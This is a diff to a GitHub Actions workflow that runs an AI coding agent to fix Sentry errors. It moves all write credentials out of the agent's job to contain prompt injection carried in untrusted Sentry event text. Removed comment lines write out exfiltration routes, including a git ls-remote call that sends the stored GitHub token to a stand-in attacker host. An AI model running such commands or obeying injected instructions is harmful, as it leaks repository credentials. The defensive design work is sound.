@@ -2,8 +2,20 @@
 #
 # Sentry Error Harness. Runs each weekday at noon EST and on manual
 # dispatch. Score job pulls unresolved Sentry issues, ranks them, and emits
-# up to 3 for the fix-error matrix. Each matrix job invokes Claude Code
-# Action to analyze and fix one error, then opens a PR.
+# up to 3 for the fix matrix.
+#
+# Three jobs, split on the credential boundary (issue #668):
+#   score-errors — read-only, deterministic; ranks issues and builds prompts.
+#   fix-error    — the generative agent. Holds NO write scope and no persisted
+#                  git credential. It cannot push, cannot open a PR, and cannot
+#                  file an issue; it writes outbox/plan.json plus its working-tree
+#                  changes, which a deterministic step packs into an artifact.
+#   land-fix     — deterministic; the only job with write scopes. Validates the
+#                  artifact, `git apply`s the patch, pushes, and publishes.
+# The split exists because the agent's prompt embeds raw Sentry event text
+# (production messages, URLs, request bodies) and an agent that can Edit files
+# and run `make check` can execute arbitrary code — so the only durable remedy
+# is to leave nothing in its reach worth stealing, not to enumerate tools.
 
 name: Sentry Error Harness
 
@@ -67,14 +79,36 @@ jobs:
     runs-on: ubuntu-latest
     # Cost ceiling: a stuck fix run otherwise bills the 6-hour job maximum.
     timeout-minutes: 45
+    # Every scope is `read`, and there is no `id-token: write` (#668). Both
+    # halves are load-bearing, and the second is the non-obvious one:
+    #
+    #  - claude-code-action's run step does `process.env.GITHUB_TOKEN =
+    #    process.env.GH_TOKEN = <token>` before starting the agent
+    #    (src/entrypoints/run.ts), and configures git auth with it
+    #    (src/modes/agent/index.ts), so whatever token it resolves IS readable
+    #    by every Bash tool call. `persist-credentials: false` clears the copy
+    #    in .git/config and nothing else.
+    #  - Which token it resolves is decided by src/github/token.ts: with no
+    #    `github_token` input it exchanges an OIDC assertion for a Claude
+    #    GitHub App installation token whose permissions are HARDCODED to
+    #    contents/pull_requests/issues: write. That token ignores this
+    #    permissions block entirely — it is why bug-patrol's PRs are authored
+    #    by `app/claude` rather than `github-actions[bot]`. Passing
+    #    `github_token` below takes the early return instead, so the agent
+    #    gets this job's own read-only token; dropping `id-token: write`
+    #    removes the OIDC assertion the exchange needs, so the app-token path
+    #    cannot come back by deleting one line.
+    #
+    # On a public repo a `contents: read` token is worth nothing to an
+    # exfiltrator anyway. The writes moved to land-fix.
     permissions:
-      contents: write
-      pull-requests: write
-      # `write`, not `read`: step 0 of the fix prompt opens an investigation
-      # issue via `gh issue create` when the root cause is in the database or a
-      # third party rather than in application code.
-      issues: write
-      id-token: write
+      contents: read
+      # Step 0 of the prompt greps `gh issue list` for a prior triage issue
+      # before proposing a new one; `read` is all that needs.
+      issues: read
+      pull-requests: read
+      # `gh run list` for the last-green-main lookup below, and the action's
+      # github_ci MCP server checks for it.
       actions: read
     strategy:
       fail-fast: false
@@ -86,6 +120,9 @@ jobs:
         uses: actions/checkout@v7
         with:
           fetch-depth: 0
+          # Belt to the read-only permissions block's braces: no GITHUB_TOKEN
+          # in .git/config for `Bash(git:*)` to read out of the workspace.
+          persist-credentials: false
 
       # Branch from the newest main commit whose Test workflow passed, not from
       # main's tip. A single unrelated red commit on main (e.g. a coverage
@@ -94,6 +131,7 @@ jobs:
       # produced nothing of the sort. Falls back to main's tip if no green run
       # is found in the last 50.
       - name: Check out last green main
+        id: base
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
@@ -103,16 +141,24 @@ jobs:
             --limit 50 --json headSha --jq '.[0].headSha // empty')
           if [ -z "$sha" ] || ! git cat-file -e "$sha^{commit}" 2>/dev/null; then
             echo "No green main run found (or SHA unreachable); staying on main tip."
-            exit 0
+          else
+            echo "Branching from last green main: $sha"
+            git checkout --detach "$sha"
           fi
-          echo "Branching from last green main: $sha"
-          git checkout --detach "$sha"
+          # The lander re-creates this exact base in its own worktree, so it
+          # must be recorded rather than re-derived (main moves).
+          echo "sha=$(git rev-parse HEAD)" >> "$GITHUB_OUTPUT"
 
       - name: Run Claude Code Action
         id: fix
         uses: anthropics/claude-code-action@be7b93b1907a4abad570368f3c74b6fe3807510b # v1
         with:
           claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
+          # Bound the agent to THIS job's read-only token. Omitting this input
+          # is what makes the action mint a contents/pull_requests/issues:write
+          # Claude App token instead (see the permissions comment above), which
+          # no `permissions:` block can restrain. Contract-tested.
+          github_token: ${{ secrets.GITHUB_TOKEN }}
           plugin_marketplaces: "https://github.com/anthropics/claude-code.git"
           plugins: "code-review@claude-code-plugins"
           prompt: ${{ matrix.error.prompt }}
@@ -121,48 +167,46 @@ jobs:
           # secrets in the stream, so the safety net the action's default
           # masking provides is largely preserved.
           show_full_output: "true"
-          # Grant the toolset the prompt's pipeline actually needs:
-          #  - Bash is scoped to the command families the pipeline uses, not
-          #    granted bare: git (branch/commit/push), gh pr create/list and
-          #    gh issue (open/comment on investigation issues), gh run list
-          #    (last-green lookup), bun/bunx (typecheck/test/lint/add), and
-          #    make (check/check-db). The agent processes untrusted
-          #    Sentry-derived text, so `gh pr merge` is deliberately NOT
-          #    grantable — nothing in this workflow merges; humans merge the
-          #    PRs the agent opens.
-          #  - Edit/Write/MultiEdit: implement the fix and add tests.
-          #  - Task: invoke /simplify and /code-review:code-review subagents.
-          #  - NO web tool. WebFetch/WebSearch are denied explicitly rather
-          #    than merely left off the allowlist, because this job is the
-          #    worst case for one: the prompt embeds raw Sentry event text
-          #    (messages, URLs, request bodies, user input — attacker-
-          #    influenceable production data, see prompt.ts's UNTRUSTED
-          #    markers) while the job holds contents/pull-requests/issues
-          #    write and a checkout that keeps GITHUB_TOKEN in .git/config.
-          #    What that buys, precisely: it removes the one egress channel an
-          #    injected instruction could use in a single tool call, so
-          #    exfiltration now requires conspicuous shell work that shows up
-          #    in the streamed job log.
-          #    What it does NOT do: close egress. This job is not
-          #    exfiltration-proof and #645's impact is not fully mitigated.
-          #    Bash(git:*) still reaches an arbitrary remote (`git push`,
-          #    `git ls-remote https://attacker/?t=$(git config --get
-          #    http.https://github.com/.extraheader)`), Bash(bun:*) still runs
-          #    `bun -e 'fetch(...)'`, Bash(bunx:*) still fetches and executes
-          #    arbitrary npm packages, and on a public repo `gh issue create`
-          #    is itself a publishing channel. Closing those means not leaving
-          #    a push-capable token in the workspace (#645 option 2) and/or a
-          #    narrower Bash allowlist — both change how this loop pushes, so
-          #    they are tracked in #668 rather than bolted on here. Narrowing
-          #    the allowlist alone would not close it either: the job must be
-          #    able to `git push` and open issues.
-          #    Same denial as bug-patrol, feedback-distill, quality-regrade,
-          #    and health-audit; pinned by ci-workflows.test.ts. Nothing in
-          #    the fix pipeline needs the network — docs live in this repo.
-          # Read/Grep/Glob are already on by default. Previous runs failed
-          # silently with 9–19 permission_denials each because none of the
-          # write/exec tools were allowed — Claude completed turns without
-          # being able to apply, validate, or push the fix.
+          # Grant the toolset the prompt's pipeline actually needs. Enumerated
+          # against prompt.ts, because this job's documented failure mode is a
+          # denial-stalled run (9–19 permission_denials each before the
+          # allowlist existed): git log/diff/show and `git log --all
+          # --diff-filter=D` for the stale-event check; bun for `bun run
+          # typecheck`, `bun run test` and `bun lint` (note: `bun lint`, not
+          # `bun run lint`); bunx for vitest invocations; make for `make check`
+          # and `make check-fast`; read-only gh for the prior-triage grep and
+          # the label/PR lookups. Edit/Write/MultiEdit implement the fix;
+          # Task runs /simplify and /code-review:code-review.
+          #
+          # What is NOT here any more (#668): `Bash(gh issue:*)` and
+          # `Bash(gh pr create:*)`. Publishing moved to land-fix, and this job
+          # holds no token that could perform either — leaving them granted
+          # would only buy 403s and wasted turns.
+          #
+          # `Bash(git:*)`, `Bash(bun:*)`, `Bash(bunx:*)` and `Bash(make:*)`
+          # stay deliberately broad, and the residual is stated rather than
+          # dressed up: this agent can still execute arbitrary code and still
+          # reach the network. It has to — `make check` runs `bun run
+          # scripts/*.ts` and `bun run test` executes test files the agent just
+          # wrote, so any allowlist that lets the pipeline work is also an
+          # arbitrary-code-execution grant. Narrowing bun/bunx to subcommands
+          # (#668 option 3) would therefore remove no capability while adding
+          # denial risk. What changed is that there is nothing here worth
+          # exfiltrating: no push-capable credential in the environment, none
+          # in .git/config, and a `contents: read` token on a public repo.
+          # Still reachable and still true: `secrets.CLAUDE_CODE_OAUTH_TOKEN`
+          # (the Anthropic credential, unavoidable while an agent runs at all)
+          # and the `id-token: write` OIDC minting endpoint. Both are noted in
+          # docs/agents/ci.md; neither can write to this repository.
+          #
+          # WebFetch/WebSearch are denied explicitly rather than left off the
+          # allowlist, so the denial reads as a decision instead of an
+          # oversight — same as bug-patrol, feedback-distill, quality-regrade
+          # and health-audit, pinned by ci-workflows.test.ts. It removes the
+          # single-tool-call egress channel; it does not close egress, and the
+          # bullet above is why that is now an acceptable posture rather than a
+          # papered-over one.
+          #
           # Sonnet is sufficient here. The harness's observed failure mode was
           # never weak reasoning — it was missing evidence: without the Sentry
           # event's contexts/extra bag, a Supabase RPC failure is indisting-
@@ -170,17 +214,120 @@ jobs:
           # The fix is the payload (see sentry-api.ts) and the step-0 triage gate
           # (see prompt.ts), not a heavier model. Revisit only if triage-passing
           # (A) fixes start coming back wrong on their merits.
-          claude_args: '--model claude-sonnet-5 --allowed-tools "Bash(git:*),Bash(gh pr create:*),Bash(gh pr list:*),Bash(gh pr view:*),Bash(gh issue:*),Bash(gh run list:*),Bash(gh label list:*),Bash(bun:*),Bash(bunx:*),Bash(make:*),Edit,Write,MultiEdit,Read,Grep,Glob,TodoWrite,Task" --disallowedTools "WebFetch,WebSearch"'
+          claude_args: '--model claude-sonnet-5 --allowed-tools "Bash(git:*),Bash(gh pr list:*),Bash(gh pr view:*),Bash(gh issue list:*),Bash(gh issue view:*),Bash(gh run list:*),Bash(gh label list:*),Bash(bun:*),Bash(bunx:*),Bash(make:*),Edit,Write,MultiEdit,Read,Grep,Glob,TodoWrite,Task" --disallowedTools "WebFetch,WebSearch"'
           additional_permissions: |
             actions: read
 
+      # Deterministic packing: the patch is derived by git from whatever the
+      # agent left in the tree, never written by the agent, so a plan that
+      # claims one thing and a tree that contains another cannot disagree
+      # about the diff. `if: always()` so a timed-out agent still ships
+      # whatever plan it managed to write — the lander decides if it is valid.
+      - name: Pack the agent outbox
+        if: always()
+        env:
+          BASE_SHA: ${{ steps.base.outputs.sha }}
+        run: |
+          set -euo pipefail
+          mkdir -p outbox
+          printf '%s\n' "$BASE_SHA" > outbox/base-sha
+          # Stage everything except the outbox itself and the (never-committed)
+          # outcome marker, then diff the index against the base commit — this
+          # captures both uncommitted edits and any commit the agent made.
+          git add -A -- . ':(exclude)outbox' ':(exclude)sentry-outcome.md'
+          git diff --cached --binary "$BASE_SHA" -- . \
+            ':(exclude)outbox' ':(exclude)sentry-outcome.md' > outbox/fix.patch
+          echo "Packed $(wc -c < outbox/fix.patch) patch bytes; plan.json:"
+          test -f outbox/plan.json && cat outbox/plan.json || echo "(no plan.json written)"
+
+      - name: Upload the agent outbox
+        if: always()
+        uses: actions/upload-artifact@v7
+        with:
+          name: sentry-outbox-${{ matrix.error.issueId }}
+          path: outbox/
+          if-no-files-found: error
+          retention-days: 7
+
+      # durable-state: exempt — land-fix is this matrix leg's durable-outcome
+      # gate. It requires the artifact above (a silently dead agent produces no
+      # plan.json and fails the lander red), and it runs the
+      # require-durable-outcome action itself once the outcome is knowable.
+      # Echo-only call here records the worker epoch for this leg.
+      - name: Record worker epoch
+        if: always()
+        uses: ./.github/actions/require-durable-outcome
+        with:
+          execution-file: ${{ steps.fix.outputs.execution_file }}
+
+  land-fix:
+    name: Land fix (${{ matrix.error.shortId }})
+    needs: [score-errors, fix-error]
+    # `!cancelled()` rather than `success()`: fix-error is a fail-fast: false
+    # matrix, so one leg dying must not strand the other legs' finished work.
+    # A leg whose agent produced nothing fails here instead, loudly.
+    if: ${{ !cancelled() && needs.score-errors.result == 'success' && fromJSON(needs.score-errors.outputs.count) > 0 }}
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    # The write scopes live here, in a job that runs no agent and never
+    # executes agent-authored content: the patch is applied with `git apply`
+    # (which evaluates nothing) and every body reaches `gh` as a file.
+    permissions:
+      contents: write
+      pull-requests: write
+      issues: write
+    strategy:
+      fail-fast: false
+      # Serialize: each leg pushes a branch and opens a PR.
+      max-parallel: 1
+      matrix:
+        error: ${{ fromJSON(needs.score-errors.outputs.errors) }}
+    steps:
+      # main's tip, NOT the agent's base commit: this is the trusted copy of
+      # the lander, and it is loaded before any agent content is applied. The
+      # patch is applied in a scratch worktree the lander creates.
+      - name: Checkout
+        uses: actions/checkout@v7
+        with:
+          fetch-depth: 0
+
+      - name: Setup Bun
+        uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2
+        with:
+          bun-version: "1.3.10"
+
+      # Downloaded outside the work tree so agent-authored files cannot land on
+      # top of the lander or its imports.
+      - name: Download the agent outbox
+        id: outbox
+        continue-on-error: true
+        uses: actions/download-artifact@v7
+        with:
+          name: sentry-outbox-${{ matrix.error.issueId }}
+          path: ${{ runner.temp }}/outbox
+
+      - name: Fail loudly when the agent produced no outbox
+        if: steps.outbox.outcome != 'success'
+        run: |
+          echo "No sentry-outbox artifact for this matrix leg. The fix-error job"
+          echo "either died before its packing step or was cancelled. Check its"
+          echo "step log for permission_denials and for an aborted agent turn."
+          exit 1
+
+      - name: Validate, apply, and publish
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          OUTBOX_DIR: ${{ runner.temp }}/outbox
+          SENTRY_ISSUE_ID: ${{ matrix.error.issueId }}
+        run: bun .github/scripts/land-sentry-fix.ts
+
       # Every triage path ends in a PR, an issue, a comment on an existing
       # issue, or a stale-event exit (see prompt.ts) — this gate makes each of
-      # those checkable, so a fix job that dies silently goes red instead of
-      # green (the historical failure mode of this workflow).
+      # those checkable, so a leg that dies silently goes red instead of green
+      # (the historical failure mode of this workflow). The lander writes
+      # sentry-outcome.md; the branch match covers the PR path.
       - name: Require durable outcome
         uses: ./.github/actions/require-durable-outcome
         with:
           match: SENTRY-${{ matrix.error.issueId }}
           outcome-file: sentry-outcome.md
-          execution-file: ${{ steps.fix.outputs.execution_file }}
